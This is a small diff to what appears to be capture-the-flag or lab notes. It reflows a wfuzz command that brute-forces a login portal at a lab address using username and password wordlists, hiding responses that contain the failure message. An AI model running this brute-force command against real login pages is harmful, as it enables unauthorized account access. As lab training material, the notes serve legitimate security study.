@@ -28,8 +28,8 @@ Customising Commands
 
 ## Brute-force the login portal using **_wfuzz_**
 ```
-wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.132.80/login.php
--d "username=FUZZ&password=FUZ2Z"
+wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" 
+-u http://10.10.132.80/login.php -d "username=FUZZ&password=FUZ2Z"
 ```
 
 In the command above:<br>
